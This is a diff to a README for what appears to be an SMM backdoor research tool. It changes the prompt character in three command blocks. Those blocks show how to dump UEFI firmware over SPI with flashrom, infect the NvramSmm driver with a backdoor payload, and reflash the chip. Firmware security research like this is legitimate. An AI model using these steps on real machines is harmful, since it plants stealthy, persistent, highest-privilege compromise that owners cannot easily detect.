@@ -196,7 +196,7 @@ Flash chip must be connected to the channel A of FT2232 Mini Module by the follo
 Now you can read flash chip contents using Flashrom:
 
 ```
-> flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin
+# flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin
 ```
 
 After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI SMM driver to infect and extract its PE32 image section from the firmware image:
@@ -206,13 +206,13 @@ After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI S
 For example, I picked `NvramSmm` UEFI SMM driver responsible for NVRAM access as pretty much suitable one. Then you can infect extracted driver with SMM backdoor using `--infect` command line option of `smm_backkdoor.py` program:
 
 ```
-> python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi
+# python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi
 ```
 
 After that you have to replace original driver image with `NvramSmm_infected.bin` one in UEFITool, save resulting firmware image and flash it back into the chip:
 
 ```
-> flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
+# flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
 ```
 
 ## Using together with Hyper-V Backdoor
